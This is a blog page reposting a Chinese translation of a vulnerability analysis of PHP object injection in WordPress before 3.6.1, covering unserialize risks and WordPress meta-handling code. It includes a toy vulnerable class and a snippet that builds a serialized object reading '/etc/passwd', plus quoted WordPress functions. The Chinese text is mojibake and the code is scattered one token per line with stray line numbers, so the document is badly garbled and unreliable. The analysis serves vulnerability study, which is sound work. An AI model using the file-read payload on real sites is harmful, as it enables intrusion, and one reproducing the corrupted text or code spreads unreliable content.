
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>The 94 Page | It so life</title>
<meta name="author" content="RobinChia">

<meta name="description" content="It so life">


<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta property="og:site_name" content="It so life"/>

<!--[if IE]><style>.testIE.IE{display:inline;}</style><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" href="/css/ie7.css" type="text/css"><![endif]-->
<!--[if (lt IE 9)&(gt IE 7)]><style>.testIE.IE8{display:inline;}</style><![endif]-->
<!--[if gt IE 8]><style>.testIE.IE9{display:inline;}</style><![endif]-->

<link href="/favicon.png" rel="icon">
<link rel="alternate" href="/atom.xml" title="It so life Feed" type="application/atom+xml">

<link rel="stylesheet" href="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/css/bootstrap.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/font-awesome/4.0.3/css/font-awesome.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/prettify/r298/prettify.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" type="text/css">
<link rel="stylesheet" href="/css/style.css" type="text/css">
<!--[if lt IE 9]>
   <style>article,aside,dialog,footer,header,section,footer,nav,figure,menu{display:block}</style>
   <script src="http://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
   <script src="http://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
<link href="http://cdn.staticfile.org/respond.js/1.4.2/respond-proxy.html" id="respond-proxy" rel="respond-proxy" />
<link href="/js/respond.proxy.gif" id="respond-redirect" rel="respond-redirect" />
<script src="/js/respond.proxy.js"></script>
   <script src="http://cdn.bootcss.com/selectivizr/1.0.2/selectivizr-min.js"></script>
<![endif]-->
<script type="text/javascript">
function loadjs(c,d){var a=document.createElement("script");a.async=!0;a.type="text/javascript";a.src=c;a.charset=d||"gbk";(document.getElementsByTagName("HEAD")[0]||document.getElementsByTagName("BODY")[0]).appendChild(a)};
var _protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
var _js2load = [];
</script>

</head>
<body>
      <header id="header" class="container"><nav id="main-nav" class="navbar navbar-default navbar-fixed-top " role="navigation">
  <div class="container">
    <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
      <span class="sr-only">Toggle navigation</span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="navbar-brand" href="/">It so life</a>
    </div>
    <div  class="collapse navbar-collapse">
      <ul  class="nav navbar-nav">
  
        <li><a href="/" title="Home">Home</a></li>      
        <li><a href="/about/" title="About">About</a></li>      
        <li><a href="/archives/" title="Archives">Archives</a></li>      
      <li class='dropdown'>
        <a class='dropdown-toggle' data-toggle='dropdown' href='#'>website<b class='caret'></b></a>
        <ul class='dropdown-menu pure-menu-selected'>
    
          <li><a href="//groups.google.com/forum/#!forum/pongba" title="TopLanguage">TopLanguage</a></li>    
          <li><a href="//itpub.net/" title="ITPub">ITPub</a></li>    
          <li><a href="//blog.jobbole.com/" title="Bole">Bole</a></li>    
          <li><a href="//nosql-database.org/" title="nosql">nosql</a></li>    
          <li><a href="//gitimmersion.googol.im/" title="Git">Git</a></li>    
        </ul>
      </li>
    
      </ul>
      <ul class="nav navbar-nav navbar-right">
      
        <li><a href="/atom.xml">RSS</a></li>
      
      
        <li><a href="https://twitter.com/robinchia">twitter</a></li>
      
      
      
      
        <li><a href="https://github.com/robinchia">github</a></li>
      
      </ul>
    </div>
  </div>
</nav>
<div class="clearfix"></div>
</header>
  <div id='content' class="container">
     <div class="page-header-wrapper">
      <!--[if lt IE 9]><div class="alert alert-warning alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>æç¤º:</strong>æ‚¨çš„æµè§ˆå™¨ç‰ˆæœ¬å¤ªä½äº†,å»ºè®®å‡çº§åˆ° <strong><a href="http://windows.microsoft.com/zh-cn/internet-explorer/download-ie" title="IE9">IE9</a></strong> ä»¥ä¸Š,æœ¬ç«™ä½¿ç”¨<a href="https://www.google.com/intl/zh-CN/chrome/">Chromeæµè§ˆå™¨</a>å¯ä»¥è·å¾—æœ€å¥½çš„æ˜¾ç¤ºæ•ˆæœ.</div><![endif]-->
      <div class="page-header"><h1 align="center"><big>It so life</big> </h1>
        <h5 align="center"><big>love as life</big></h5>
      </div>
     </div>
     <div class="row">
       <div id="main-col" class="alignleft col-sx-12 col-sm-8 col-md-9 col-lg-9">
      <section id='header_widget'></section>
          <div id="wrapper"><article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-å®‰å…¨-PHP-WordPress--WordPress-361PHPå¯¹è±¡æ³¨å…¥æ¼æ´-WooYunçŸ¥è¯†åº“/">WordPress </a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-å®‰å…¨-PHP-WordPress--WordPress-361PHPå¯¹è±¡æ³¨å…¥æ¼æ´-WooYunçŸ¥è¯†åº“/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="wordpress-3-6-1-php-wooyun-">WordPress &lt; 3.6.1 PHP å¯¹è±¡æ³¨å…¥æ¼æ´ | WooYunçŸ¥è¯†åº“</h1>
<h3 id="-">åˆ†äº«åˆ°</h3>
<ul>
<li><a href="">ä¸€é”®åˆ†äº«</a></li>
<li><a href="">QQç©ºé—´</a></li>
<li><a href="">æ–°æµªå¾®åš</a></li>
<li><a href="">ç™¾åº¦äº‘æ”¶è—</a></li>
<li><a href="">äººäººç½‘</a></li>
<li><a href="">è…¾è®¯å¾®åš</a></li>
<li><a href="">ç™¾åº¦ç›¸å†Œ</a></li>
<li><a href="">å¼€å¿ƒç½‘</a></li>
<li><a href="">è…¾è®¯æœ‹å‹</a></li>
<li><a href="">ç™¾åº¦è´´å§</a></li>
<li><a href="">è±†ç“£ç½‘</a></li>
<li><a href="">æœç‹å¾®åš</a></li>
<li><a href="">ç™¾åº¦æ–°é¦–é¡µ</a></li>
<li><a href="">QQå¥½å‹</a></li>
<li><a href="">å’Œè®¯å¾®åš</a></li>
<li><a href="">æ›´å¤š...</a></li>
</ul>
<p><a href="">ç™¾åº¦åˆ†äº«</a></p>
<h1 id="-wooyun-http-drops-wooyun-org-wooyun-"><a href="http://drops.wooyun.org/" title="WooYunçŸ¥è¯†åº“" target="_blank">WooYunçŸ¥è¯†åº“</a></h1>
<p><a href="http://drops.wooyun.org/login" title="ç™»å½•" target="_blank">ç™»å½•</a></p>
<p>åƒä¸€æœµä¹Œäº‘ä¸€æ ·æˆé•¿</p>
<ul>
<li><a href="http://drops.wooyun.org/" title="WooYunçŸ¥è¯†åº“" target="_blank">é¦–é¡µ</a></li>
<li><a href="http://www.wooyun.org/" target="_blank">WooYun</a></li>
<li><a href="http://zone.wooyun.org/" target="_blank">Zone</a></li>
<li><a href="http://drops.wooyun.org/newsend" target="_blank">æŠ•ç¨¿</a>
<a href="http://drops.wooyun.org/" title="é¦–é¡µ" target="_blank">é¦–é¡µ</a> Â» <a href="http://drops.wooyun.org/category/papers" title="æŸ¥çœ‹ æ¼æ´åˆ†æ ä¸­çš„å…¨éƒ¨æ–‡ç« " target="_blank">æ¼æ´åˆ†æ</a> Â» WordPress &lt; 3.6.1 PHP å¯¹è±¡æ³¨å…¥æ¼æ´</li>
</ul>
<h2 id="-wordpress-3-6-1-php-http-drops-wooyun-org-papers-596-permanent-link-to-wordpress-3-6-1-php-"><a href="http://drops.wooyun.org/papers/596" title="Permanent Link to WordPress &lt; 3.6.1 PHP å¯¹è±¡æ³¨å…¥æ¼æ´" target="_blank">WordPress &lt; 3.6.1 PHP å¯¹è±¡æ³¨å…¥æ¼æ´</a></h2>
<p>9äººæ”¶è— <a href="">æ”¶è—</a></p>
<p>2013/09/13 11:36  | <a href="http://drops.wooyun.org/author/äº”é“å£æ€æ°”" title="ç”± äº”é“å£æ€æ°” å‘å¸ƒ" target="_blank">äº”é“å£æ€æ°”</a>  | <a href="http://drops.wooyun.org/category/papers" title="æŸ¥çœ‹ æ¼æ´åˆ†æ ä¸­çš„å…¨éƒ¨æ–‡ç« " target="_blank">æ¼æ´åˆ†æ</a>  | <a href="">å ä¸ªåº§å…ˆ</a></p>
<p>From:<a href="http://vagosec.org/2013/09/wordpress-php-object-injection/" target="_blank">WordPress &lt; 3.6.1 PHP Object Injection</a></p>
<h2 id="0x00-">0x00 èƒŒæ™¯</h2>
<p>å½“æˆ‘è¯»åˆ°ä¸€ç¯‡å…³äºJoomlaçš„â€œPHPå¯¹è±¡æ³¨å°„â€çš„æ¼æ´blogåï¼Œæˆ‘æŒ–æ·±äº†ä¸€ç‚¹å°±å‘ç°Stefan Esserå¤§ç¥åœ¨2010å¹´é»‘å¸½å¤§ä¼šçš„æ–‡ç« ï¼š</p>
<p><a href="http://media.blackhat.com/bh-us-10/presentations/Esser/BlackHat-USA-2010-Esser-Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits-slides.pdf" target="_blank"><a href="http://media.blackhat.com/bh-us-10/presentations/Esser/BlackHat-USA-2010-Esser-Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits-slides.pdf">http://media.blackhat.com/bh-us-10/presentations/Esser/BlackHat-USA-2010-Esser-Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits-slides.pdf</a></a></p>
<p>è¿™ç¯‡æ–‡ç« æåˆ°äº†PHPä¸­çš„unserializeå‡½æ•°å½“æ“ä½œç”¨æˆ·ç”Ÿæˆçš„æ•°æ®çš„æ—¶å€™ä¼šäº§ç”Ÿå®‰å…¨æ¼æ´ã€‚</p>
<p>æ‰€ä»¥å‘¢ï¼ŒåŸºæœ¬æ¥è¯´ï¼Œunserializeå‡½æ•°æ‹¿åˆ°è¡¨ç°ä¸ºåºåˆ—åŒ–çš„æ•°æ®ï¼Œç„¶åå°±è§£åºåˆ—åŒ–å®ƒï¼ˆunserializeå˜›ï¼Œå½“ç„¶å°±å¹²è¿™ä¸ªå•Š~ï¼‰ä¸ºphpçš„å€¼ã€‚è¿™ä¸ªå€¼å®ƒå¯ä»¥æ˜¯resourceä¹‹å¤–çš„ä»»ä½•ç±»å‹ï¼Œå¯ä¸ºï¼ˆinteger, double, string, array, boolean, object, NULLï¼‰ï¼Œå½“è¿™ä¸ªå‡½æ•°æ“ä½œä¸€ä¸ªç”¨æˆ·ç”Ÿæˆçš„å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œåœ¨ä½ç‰ˆæœ¬çš„PHPä¸­å¯èƒ½ä¼šäº§ç”Ÿå†…å­˜æ³„éœ²çš„æ¼æ´ï¼Œå½“ç„¶è¿™ä¹Ÿä¸æ˜¯è¿™ç¯‡blogè¦å…³æ³¨çš„é—®é¢˜ã€‚å¦‚æœä½ å¯¹è¿™ä¸ªé—®é¢˜æ„Ÿå…´è¶£ï¼Œä½ å¯ä»¥å†å»çœ‹çœ‹æˆ‘ä¸Šé¢è¯´çš„å¤§ç¥çš„æ–‡ç« ã€‚</p>
<p>å¦å¤–ä¸€ç§æ”»å‡»æ–¹å¼å‘ç”Ÿåœ¨å½“æ”»å‡»è€…çš„è¾“å…¥è¢«unserializeå‡½æ•°æ“ä½œçš„æ—¶å€™ï¼Œè¿™ç§å°±æ˜¯æˆ‘è¯´åˆ°çš„â€œPHPå¯¹è±¡æ³¨å…¥â€ã€‚åœ¨è¿™ç§æ–¹å¼ä¸­ï¼Œå¯¹è±¡ç±»å‹çš„è¢«unserializeçš„è¯ï¼Œå…è®¸æ”»å‡»è€…è®¾ç½®ä»–é€‰æ‹©å¯¹è±¡çš„å±æ€§ã€‚å½“è¿™äº›å¯¹è±¡ä¸­çš„æ–¹æ³•è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œä¼šå‡ºç°ä¸€äº›æ•ˆæœï¼ˆä¾‹å¦‚ï¼šåˆ é™¤ä¸€äº›æ–‡ä»¶ï¼‰ï¼Œå½“æ”»å‡»è€…å¯ä»¥å»é€‰æ‹©å¯¹è±¡é‡Œçš„ä¸€äº›å±æ€§çš„æ—¶å€™ï¼Œä»–å°±èƒ½å¤Ÿåˆ é™¤ä¸€ä¸ªä»–æ‰€æäº¤çš„æ–‡ä»¶ã€‚</p>
<p>è®©æˆ‘ä»¬ä¸¾ä¸ªä¾‹å­å§ï¼Œæƒ³è±¡ä»¥ä¸‹çš„ä»£ç ä¸­çš„classæ˜¯ç”¨æˆ·è‡ªå·±ç”Ÿæˆçš„å†…å®¹è¢«unserializeæ—¶è½½å…¥çš„ï¼š</p>
<p>ï¼ˆps:è€å¤–è´´å‡ºçš„ä»£ç è¯­æ³•æœ‰é—®é¢˜ï¼Œæ”¹äº†ä¸€ä¸‹æµ‹è¯•æˆåŠŸâ€¦â€¦ï¼‰
1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
9</p>
<p>10
11</p>
<p>12
13</p>
<p>14
15</p>
<p>16
17&lt;?php</p>
<p>class</p>
<p>Foo {</p>
<p>private</p>
<p>$bar</p>
<p>;</p>
<p>public</p>
<p>$file</p>
<p>;</p>
<p>public</p>
<p>function</p>
<p>__construct(</p>
<p>$fileName</p>
<p>) {</p>
<p>$this</p>
<p>-&gt;bar =</p>
<p>&#39;foobar&#39;</p>
<p>;</p>
<p>$this</p>
<p>-&gt;file =</p>
<p>$fileName</p>
<p>;</p>
<p>}</p>
<p>// ä¸€äº›å…¶ä»–çš„ä»£ç â€¦â€¦</p>
<p>public</p>
<p>function</p>
<p>__toString() {</p>
<p>return</p>
<p>file_get_contents</p>
<p>(</p>
<p>$this</p>
<p>-&gt;file);</p>
<p>}</p>
<p>}
?&gt;</p>
<p>å¦‚æœå—å®³çš„ç¼ºé™·ä»£ç åŒæ—¶è¿˜å­˜åœ¨ä»¥ä¸‹çš„ä»£ç ï¼š</p>
<p>1echo</p>
<p>unserialize(</p>
<p>$_GET</p>
<p>[</p>
<p>&#39;in&#39;</p>
<p>]);</p>
<p>è¿™æ”»å‡»è€…å°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥å¦‚ä¸‹å»æ„é€ å®ƒçš„å¯¹è±¡ã€‚</p>
<p>1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
&lt;?php</p>
<p>class</p>
<p>Foo {</p>
<p>public</p>
<p>$file</p>
<p>;</p>
<p>}
$foo</p>
<p>=</p>
<p>new</p>
<p>Foo();</p>
<p>$foo</p>
<p>-&gt;file =</p>
<p>&#39;/etc/passwd&#39;</p>
<p>;
echo</p>
<p>serialize(</p>
<p>$foo</p>
<p>);</p>
<p>?&gt;</p>
<p>ä¸Šé¢è¿™æ®µä»£ç çš„ç»“æœæ˜¯ï¼šO:3:&quot;Foo&quot;:1:{s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;} ï¼Œæ”»å‡»è€…ç°åœ¨è¦åšçš„äº‹æƒ…å°±äº‹é€šè¿‡æäº¤getè¯·æ±‚åˆ°å­˜åœ¨æ¼æ´çš„é¡µé¢è§¦å‘ä»–çš„æ”»å‡»ä»£ç ã€‚è¿™ä¸ªé¡µé¢ä¼šåå‡º/etc/passwdçš„å†…å®¹æ¥ã€‚èƒ½è¯»åˆ°è¿™äº›æ–‡ä»¶çš„å†…å®¹æ€ä¹ˆçœ‹éƒ½ä¸æ˜¯ä¸€ä¸ªå¥½äº‹æƒ…ï¼Œä½ å°±æƒ³è±¡ä¸€ä¸‹ï¼Œä¸‡ä¸€ç¼ºé™·ä»£ç ä¸­çš„å‡½æ•°ä¸æ˜¯file_get_contentsè€Œæ˜¯evalå‘¢ï¼Ÿ</p>
<p>æˆ‘ç›¸ä¿¡ä¸Šé¢è¿™éƒ¨åˆ†å·²ç»èƒ½è®©äººæ˜ç™½å…è®¸ç”¨æˆ·è¾“å…¥è¿›å…¥unserializeè¿™ä¸ªå‡½æ•°å±å®³æœ‰å¤šå¤§äº†ã€‚å°±è¿PHPæ‰‹å†Œé‡Œä¹Ÿè¯´äº†ä¸è¦æŠŠç”¨æˆ·ç”Ÿæˆçš„å†…å®¹äº¤ç»™unserializeå‡½æ•°ã€‚</p>
<h3 id="-">è­¦å‘Šï¼š</h3>
<p>ä¸è¦æŠŠä¸å¯ä¿¡çš„ç”¨æˆ·è¾“å…¥äº¤ç»™unserializeï¼Œä½¿ç”¨è¯¥å‡½æ•°è§£åºåˆ—åŒ–å†…å®¹èƒ½å¯¼è‡´è®¿é—®ä¸”è‡ªåŠ¨è½½å…¥å¯¹è±¡ï¼Œæ¶æ„ç”¨æˆ·å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œä»å®‰å…¨çš„è§’åº¦ï¼Œå¦‚æœä½ æƒ³è®©ç”¨æˆ·å¯ä»¥æ ‡å‡†çš„ä¼ é€’æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨json ï¼ˆjson_encode json_decodeï¼‰ã€‚</p>
<p>å¥½ï¼Œè®©æˆ‘ä»¬ç»§ç»­è¯´è¿™äº›é—®é¢˜æ€ä¹ˆå½±å“åˆ°Wordpressã€‚</p>
<h2 id="0x01-wordpress-">0x01 wordpressçš„å®‰å…¨é—®é¢˜</h2>
<p>Stefan Esser&#39;sçš„é»‘å¸½æ¼”è®²ä¸­ï¼Œä»–æåˆ°Wordpressæ˜¯ä¸€æ¬¾ä½¿ç”¨äº†serializeå’Œunserializeå‡½æ•°çš„çŸ¥ååº”ç”¨ã€‚åœ¨ä»–çš„å¹»ç¯ç‰‡ä¸­ï¼Œunserializeç”¨æ¥æ¥æ”¶æ¥è‡ªWordpressç«™ç‚¹ä¸Šçš„æ•°æ®ã€‚æ‰€ä»¥æ”»å‡»è€…å¯ä»¥åœ¨å—å®³ç«™ç‚¹ä¸Šå‘èµ·ä¸€æ¬¡ä¸­é—´äººæ”»å‡»ã€‚ä»–å¯ä»¥ä¿®æ”¹æ¥è‡ªWordpressç«™ç‚¹çš„è¿”å›æ•°æ®ï¼ŒæŠŠä»–çš„ä»£ç åŠ è¿›å»ã€‚æœ‰è¶£çš„æ˜¯å°±åœ¨æˆ‘ç¼–å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™ï¼ŒWordpressæœ€æ–°çš„ç‰ˆæœ¬ä¹ŸåŒ…å«è¿™ä¸ªé—®é¢˜ï¼ˆè·ç¦»é‚£æ¼”è®²ä¼¼ä¹è¿‡å»ä¸‰å¹´äº†ï¼‰ï¼Œæƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœæœ‰é»‘å®¢å¯ä»¥åŠ«æŒWordPress.orgçš„DNSä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…å§ã€‚</p>
<p>ç„¶è€Œï¼Œè¿™ä¹Ÿä¸æ˜¯Wordpressä½¿ç”¨è¿™ä¸ªunserializeçš„å”¯ä¸€åœ°æ–¹ï¼Œå®ƒè¿˜ç”¨äºç”¨äºåœ¨æ•°æ®åº“ä¸­æ•°æ®ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·çš„metadataå°±è¢«åºåˆ—åŒ–åå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œmetadataçš„å–å›æ–¹å¼åœ¨wp-includes/meta.phpçš„272è¡Œçš„get_metadata()ï¼Œæˆ‘åœ¨è¿™é‡Œå¼•ç”¨ä¸€ä¸‹è¯¥å‡½æ•°çš„éƒ¨åˆ†ä»£ç ï¼ˆ292-297è¡Œï¼‰
1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
if</p>
<p>( isset(</p>
<p>$meta_cache</p>
<p>[</p>
<p>$meta_key</p>
<p>]) ) {</p>
<p>if</p>
<p>(</p>
<p>$single</p>
<p>)</p>
<p>return</p>
<p>maybe_unserialize(</p>
<p>$meta_cache</p>
<p>[</p>
<p>$meta_key</p>
<p>][0] );</p>
<p>else</p>
<p>return</p>
<p>array_map</p>
<p>(</p>
<p>&#39;maybe_unserialize&#39;</p>
<p>,</p>
<p>$meta_cache</p>
<p>[</p>
<p>$meta_key</p>
<p>]);</p>
<p>}</p>
<p>åŸºæœ¬ä¸Šï¼Œè¿™ä¸ªå‡½æ•°æ‰€å¹²çš„äº‹æƒ…å°±æ˜¯å–å›æ•°æ®åº“é‡Œçš„metadataï¼ˆå®ƒæ¥è‡ªæ¯ç¯‡æ–‡ç« æˆ–ç”¨æˆ·è¾“å…¥ï¼‰ï¼Œæ•°æ®åœ¨æ•°æ®åº“ä¸­çš„wp_postmetaå’Œwp_usermetaè¡¨ä¸­ï¼Œæœ‰äº›æ•°æ®æ˜¯è¢«åºåˆ—åŒ–çš„è€Œæœ‰äº›æ²¡æœ‰è¢«åºåˆ—åŒ–ï¼Œæ‰€ä»¥maybe_unserialize()å‡½æ•°æ›¿ä»£äº†unserialize()åœ¨è¿™é‡Œæ“ä½œï¼Œè¿™ä¸ªå‡½æ•°åœ¨wp-includes/functions.phpçš„230åˆ°234è¡Œä¹‹é—´è¢«å®šä¹‰ã€‚</p>
<p>1</p>
<p>2
3</p>
<p>4
5function</p>
<p>maybe_unserialize(</p>
<p>$original</p>
<p>) {</p>
<p>if</p>
<p>( is_serialized(</p>
<p>$original</p>
<p>) )</p>
<p>//åºåˆ—åŒ–çš„æ•°æ®æ‰ä¼šèµ°åˆ°è¿™é‡Œé¢</p>
<p>return</p>
<p>@unserialize(</p>
<p>$original</p>
<p>);</p>
<p>return</p>
<p>$original</p>
<p>;
}</p>
<p>æ‰€ä»¥ï¼Œè¿™ä¸ªå‡½æ•°å¹²çš„äº‹æƒ…æ˜¯æ£€æŸ¥ç»™äºˆå®ƒçš„å€¼æ˜¯ä¸æ˜¯ä¸€ä¸ªåºåˆ—åŒ–çš„æ•°æ®ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°±è§£åºåˆ—åŒ–ã€‚è¿™é‡Œç”¨æ¥åˆ¤æ–­æ˜¯å¦æ˜¯åºåˆ—åŒ–æ‰€ä½¿ç”¨çš„å‡½æ•°æ˜¯is_serialized()ï¼Œå®ƒçš„å®šä¹‰åœ¨åŒæ–‡ä»¶çš„247åˆ°276è¡Œä¹‹é—´ã€‚</p>
<p>1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
9</p>
<p>10
11</p>
<p>12
13</p>
<p>14
15</p>
<p>16
17</p>
<p>18
19</p>
<p>20
21</p>
<p>22
23</p>
<p>24
25</p>
<p>26
27</p>
<p>28
29</p>
<p>30
function</p>
<p>is_serialized(</p>
<p>$data</p>
<p>) {</p>
<p>// å¦‚æœè¿å­—ç¬¦ä¸²éƒ½ä¸æ˜¯ï¼Œé‚£å°±ä¸æ˜¯åºåˆ—åŒ–çš„æ•°æ®äº†</p>
<p>if</p>
<p>( !</p>
<p>is_string</p>
<p>(</p>
<p>$data</p>
<p>) )</p>
<p>return</p>
<p>false;</p>
<p>$data</p>
<p>= trim(</p>
<p>$data</p>
<p>);</p>
<p>if</p>
<p>(</p>
<p>&#39;N;&#39;</p>
<p>==</p>
<p>$data</p>
<p>)</p>
<p>return</p>
<p>true;</p>
<p>$length</p>
<p>=</p>
<p>strlen</p>
<p>(</p>
<p>$data</p>
<p>);</p>
<p>if</p>
<p>(</p>
<p>$length</p>
<p>&lt; 4 )</p>
<p>return</p>
<p>false;</p>
<p>if</p>
<p>(</p>
<p>&#39;:&#39;</p>
<p>!==</p>
<p>$data</p>
<p>[1] )</p>
<p>return</p>
<p>false;</p>
<p>$lastc</p>
<p>=</p>
<p>$data</p>
<p>[</p>
<p>$length</p>
<p>-1];</p>
<p>if</p>
<p>(</p>
<p>&#39;;&#39;</p>
<p>!==</p>
<p>$lastc</p>
<p>&amp;&amp;</p>
<p>&#39;}&#39;</p>
<p>!==</p>
<p>$lastc</p>
<p>)</p>
<p>return</p>
<p>false;</p>
<p>$token</p>
<p>=</p>
<p>$data</p>
<p>[0];</p>
<p>switch</p>
<p>(</p>
<p>$token</p>
<p>) {</p>
<p>case</p>
<p>&#39;s&#39;</p>
<p>:</p>
<p>if</p>
<p>(</p>
<p>&#39;&quot;&#39;</p>
<p>!==</p>
<p>$data</p>
<p>[</p>
<p>$length</p>
<p>-2] )</p>
<p>return</p>
<p>false;</p>
<p>case</p>
<p>&#39;a&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;O&#39;</p>
<p>:</p>
<p>return</p>
<p>(bool) preg_match(</p>
<p>&quot;/^{$token}:[0-9]+:/s&quot;</p>
<p>,</p>
<p>$data</p>
<p>);</p>
<p>case</p>
<p>&#39;b&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;i&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;d&#39;</p>
<p>:</p>
<p>return</p>
<p>(bool) preg_match(</p>
<p>&quot;/^{$token}:[0-9.E-]+;\$/&quot;</p>
<p>,</p>
<p>$data</p>
<p>);</p>
<p>}</p>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>WordPressæ£€æŸ¥ä¸€ä¸ªå€¼æ˜¯å¦æ˜¯åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸ºä»€ä¹ˆé‚£ä¹ˆé‡è¦çš„åŸå› é©¬ä¸Šè¦å˜å¾—æ¸…æ™°äº†ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ä¸€ä¸ªæ”»å‡»è€…å¦‚ä½•æŠŠä»–çš„å†…å®¹æœ€ç»ˆåŠ å…¥åˆ°metadataè¡¨ä¸­çš„ã€‚æ¯ä¸ªç”¨æˆ·çš„å§“åï¼Œé›…è™IMéƒ½å­˜å‚¨åœ¨wp_usermetaè¡¨é‡Œã€‚æ‰€ä»¥æˆ‘ä»¬æŠŠè‡ªå·±çš„æ¶æ„ä»£ç åŠ åœ¨é‚£æˆ‘ä»¬å°±å¯ä»¥ææ‚æ‰WordPressï¼Œå¯¹ä¸å¯¹ï¼Ÿä½ å¯ä»¥è¯•è¯•åœ¨ä½ è¯¥å†™åå­—çš„åœ°æ–¹å†™ä¸ªi:1è¯•è¯•ï¼Œå¦‚æœè¿™ä¸ªæ²¡æœ‰è¢«è§£åºåˆ—åŒ–é‚£è¿™é‡Œåªä¼šè¿”å›ä¸€ä¸ªæˆ‘ä»¬è¾“å…¥çš„i:1ã€‚</p>
<p>éº»ç—¹çš„ï¼Œçœ‹æ¥è¦å‘å‡ ä¸ªå¤§æ‹›æ‰å¯ä»¥ææ‚WordPresså•Šã€‚è®©æˆ‘ä»¬æŒ–å¾—å†æ·±ä¸€ç‚¹ï¼Œçœ‹çœ‹ä¸ºä»€ä¹ˆè¿™ä¸ªä¸œè¥¿å°±æ²¡æœ‰ç»™è§£åºåˆ—åŒ–ã€‚åœ¨ wp-includes/meta.php ä¸­ï¼Œè¿™ä¸ªupdate_metadata() å‡½æ•°å®šä¹‰åœ¨101-164è¡Œï¼Œè¿™é‡Œæœ‰è¿™ä¸ªå‡½æ•°çš„éƒ¨åˆ†ä»£ç ã€‚
1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
9</p>
<p>10
// â€¦</p>
<p>$meta_value</p>
<p>= wp_unslash(</p>
<p>$meta_value</p>
<p>);</p>
<p>$meta_value</p>
<p>= sanitize_meta(</p>
<p>$meta_key</p>
<p>,</p>
<p>$meta_value</p>
<p>,</p>
<p>$meta_type</p>
<p>);</p>
<p>// â€¦</p>
<p>$meta_value</p>
<p>= maybe_serialize(</p>
<p>$meta_value</p>
<p>);</p>
<p>$data</p>
<p>= compact(</p>
<p>&#39;meta_value&#39;</p>
<p>);</p>
<p>// â€¦</p>
<p>$wpdb</p>
<p>-&gt;update(</p>
<p>$table</p>
<p>,</p>
<p>$data</p>
<p>,</p>
<p>$where</p>
<p>);</p>
<p>// â€¦</p>
<p>è¿™é‡Œmaybe_serializeå‡½æ•°å¯èƒ½èƒ½è§£é‡Šä¸ºä»€ä¹ˆæˆ‘ä»¬åˆšæ‰çš„æ“ä½œæ²¡æˆåŠŸï¼Œæˆ‘ä»¬å†è·Ÿè¿›å»çœ‹çœ‹è¿™ä¸ªå‡½æ•°ï¼Œå®ƒå®šä¹‰åœ¨wp-includes/functions.phpçš„314-324è¡Œã€‚</p>
<p>1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
9</p>
<p>10
function</p>
<p>maybe_serialize(</p>
<p>$data</p>
<p>) {</p>
<p>if</p>
<p>(</p>
<p>is_array</p>
<p>(</p>
<p>$data</p>
<p>) ||</p>
<p>is_object</p>
<p>(</p>
<p>$data</p>
<p>) )</p>
<p>return</p>
<p>serialize(</p>
<p>$data</p>
<p>);</p>
<p>// äºŒæ¬¡åºåˆ—åŒ–æ˜¯ä¸ºäº†å‘ä¸‹æ”¯æŒ</p>
<p>// è¯¦è§ <a href="http://core.trac.wordpress.org/ticket/12930" target="_blank">http://core.trac.wordpress.org/ticket/12930</a></p>
<p>if</p>
<p>( is_serialized(</p>
<p>$data</p>
<p>) )</p>
<p>return</p>
<p>serialize(</p>
<p>$data</p>
<p>);</p>
<p>return</p>
<p>$data</p>
<p>;</p>
<p>}</p>
